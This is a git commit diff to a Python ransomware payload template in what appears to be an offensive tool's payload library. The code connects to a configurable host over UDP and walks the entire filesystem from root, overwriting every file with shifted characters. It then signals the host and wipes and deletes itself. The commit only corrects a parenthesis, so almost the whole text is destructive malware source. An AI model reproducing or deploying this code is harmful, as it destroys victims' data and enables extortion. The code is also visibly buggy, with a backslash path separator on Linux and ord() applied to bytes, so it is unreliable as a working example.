0c3d205cdd2ab530405c056398f69646880a870d
Zer0 <000Zer000@protonmail.com>
2020-08-20 14:38:12 +0800

    Update linux.py

--- lib/payloads/ransomware/python_ransomware_udp/linux.py
+++ lib/payloads/ransomware/python_ransomware_udp/linux.py
@@ -7,6 +7,6 @@ conn = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 conn.connect(('{self.host}' , int({self.port})))
 from os import walk
 for r, _, fs in walk('/'):\n\t\tif len(fs) == 0:\n\t\t\tpass\n\t\tfor f in fs:\n\t\t\twith open(r +'\\' +f, "rb+") as f:
-\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {int(self.shift)}))for l in fd))
+\t\t\t\tfd = f.read()\n\t\t\t\tf.truncate()\n\t\t\t\tf.write(''.join(chr(ord(l) + {int(self.shift)}for l in fd)))
 conn.send(b"->|")\nwith open(__file__, "rb+") as f:\n\tfd = f.read()\n\tf.truncate()\n\tf.write(b'0' * len(fd))\n\tos.remove(__file__)
         """
